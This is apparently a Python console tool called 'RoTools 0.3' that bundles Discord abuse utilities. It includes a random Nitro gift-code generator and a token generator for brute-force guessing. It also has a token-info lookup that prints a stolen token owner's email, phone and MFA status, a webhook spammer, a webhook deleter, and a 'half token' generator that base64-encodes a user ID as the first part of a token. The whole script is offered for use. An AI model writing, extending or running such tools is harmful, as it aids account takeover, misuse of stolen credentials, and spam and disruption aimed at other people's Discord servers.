# ═║╔╗╚╝╠╣╩╬
#Colorama
from colorama import *
#Others
import os, requests, random, string, base64
#Credits

def Credits():
    os.system(f'title RoTools 0.3 - Credits')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Made By: RodrikWan                                      ║")
    print(F"{Fore.CYAN}║ Version: 0.3.0-prealpha                                 ║")
    print(F"{Fore.CYAN}║                                                         ║")
    print(F"{Fore.CYAN}║ Changelog:                                              ║")
    print(F"{Fore.CYAN}║ - Added Half Token from user ID                         ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    input("\nPress [Enter] to return to Main Menu")
    MainMenu()

#Discord Menu

def DiscordMenu():
    os.system(f'title RoTools 0.3 - Discord Menu')
    os.system('cls')
    
    print(f"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(f"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(f"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(f"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(f"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(f"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(f"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║ Discord Menu                                            ║")
    print(f"{Fore.CYAN}║                                                         ║")
    print(f"{Fore.CYAN}║ 1 - Nitro Generator                                     ║")
    print(f"{Fore.CYAN}║ 2 - Token Generator                                     ║")
    print(f"{Fore.CYAN}║ 3 - Token Info                                          ║")
    print(f"{Fore.CYAN}║ 4 - Webhook Spammer                                     ║")
    print(f"{Fore.CYAN}║ 5 - Webhook Deleter                                     ║")
    print(f"{Fore.CYAN}║ 6 - Half token from user ID                             ║")
    print(f"{Fore.CYAN}║ 0 - Main Menu                                           ║")
    print(f"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    DiscordMenuChoice = int(input(f"{Fore.CYAN}\nOption: "))
    
    if DiscordMenuChoice == 1:
        NitroGenerator()
    if DiscordMenuChoice == 2:
        TokenGenerator()
    if DiscordMenuChoice == 3:
        TokenInfo()
    if DiscordMenuChoice == 4:
        WebhookSpammer()
    if DiscordMenuChoice == 5:
        WebhookDeleter()
    if DiscordMenuChoice == 6:
        HalfToken()
    if DiscordMenuChoice == 0:
        MainMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Incorrect option")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > Nitro Generator

def NitroGenerator():
    os.system(f'title RoTools 0.3 - Nitro Generator')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Discord Nitro Generator                                 ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    try:
        NitroGeneratorAmount = int(input('\nAmount: '))
        print()
        value = 1
        while value <= NitroGeneratorAmount:
            code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
            print(f'{code}')
            value += 1
        print(f"\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Generated {NitroGeneratorAmount} codes.")
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu.")
        DiscordMenu()
    except ValueError:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid amount")
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > Token Generator

def TokenGenerator():
    os.system(f'title RoTools 0.3 - Token Generator')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Discord Token Generator                                 ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    try:
        TokenGeneratorAmount = int(input('\nAmount: '))
        print()
        value = 1
        while value <= TokenGeneratorAmount:
            code = "Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
            print(f'{code}')
            value += 1
        print(f"\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Generated {TokenGeneratorAmount} tokens.")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    except ValueError:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid amount")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > Token Info

def TokenInfo():
    os.system(f'title RoTools 0.3 - Token Info')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Discord Token Info                                      ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    TokenInfoToken = input('\nToken: ')
    headers = {'Authorization': TokenInfoToken, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        verified = r.json()['verified']
        
        print(f"\nUser: {userName}")
        print(f"ID: {userID}")
        print(f"Phone: {phone}")
        print(f"Email: {email}")
        print(f"MFA: {mfa}")
        print(f"Verified: {verified}")
        print(f"Token: {TokenInfoToken}")
        print(f"\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Info generated")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid Token")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > WebHook Spammer

def WebhookSpammer():
    os.system(f'title RoTools 0.3 - Webhook Spammer')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Discord Webhook Spammer                                 ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    try:
        WebhookSpammerWebhook = input("\nWebhook: ")
        WebhookSpammerMessage = input("Message: ")
        WebhookSpammerAmount = int(input("Amount: "))
        print()
        for i in range(WebhookSpammerAmount):
            _data = requests.post(WebhookSpammerWebhook, json={'content': WebhookSpammerMessage}, headers={'Content-Type': 'application/json'})
            if _data.status_code < 400:
                print(f'{Fore.GREEN}[SUCCESS] {Fore.WHITE}Sent a message')
        print(f'\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Sent {WebhookSpammerAmount} messages')
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
        DiscordMenu()
    except:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Couldn't spam Webhook")
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > Webhook Deleter

def WebhookDeleter():
    os.system(f'title RoTools 0.3 - Webhook Deleter')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Discord Webhook Deleter                                 ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    try:
        WebhookDeleterWebhook = input("\nWebhook: ")
        requests.delete(WebhookDeleterWebhook.rstrip())
        print(f'\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Webhook deleted')
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
        DiscordMenu()
    except:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Couldn't delete Webhook")
        input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > HalfToken

def HalfToken():
    os.system(f'title RoTools 0.3 - Half Token')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Half token from user ID                                 ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    userid = input('\nUserID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    HalfTokenGen = bas64_bytes.decode('utf-8')
    print(f'\nHalf Token: {HalfTokenGen}')
    print(f'\n{Fore.GREEN}[SUCCESS] {Fore.WHITE}Half token generated')
    input(f"\n{Fore.CYAN}Press [Enter] to return to Discord Menu")
    DiscordMenu()

#Main Menu

def MainMenu():
    os.system(f'title RoTools 0.3 - Main Menu')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")
    print(F"{Fore.CYAN}║██████╗░░█████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗║")
    print(F"{Fore.CYAN}║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝║")
    print(F"{Fore.CYAN}║██████╔╝██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░║")
    print(F"{Fore.CYAN}║██╔══██╗██║░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗║")
    print(F"{Fore.CYAN}║██║░░██║╚█████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝║")
    print(F"{Fore.CYAN}║╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")
    print(F"{Fore.CYAN}║ Main Menu                                               ║")
    print(F"{Fore.CYAN}║                                                         ║")
    print(F"{Fore.CYAN}║ 1 - Credits                                             ║")
    print(F"{Fore.CYAN}║ 2 - Discord Menu                                        ║")
    print(F"{Fore.CYAN}║ 0 - Exit                                                ║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")
    
    MainMenuChoice = int(input(f"\n{Fore.CYAN}Option: "))
    
    if MainMenuChoice == 1:
        Credits()
    if MainMenuChoice == 2:
        DiscordMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Incorrect option")
        input(f'\n{Fore.CYAN}Press [Enter] to return to Main Menu')
        MainMenu()

MainMenu()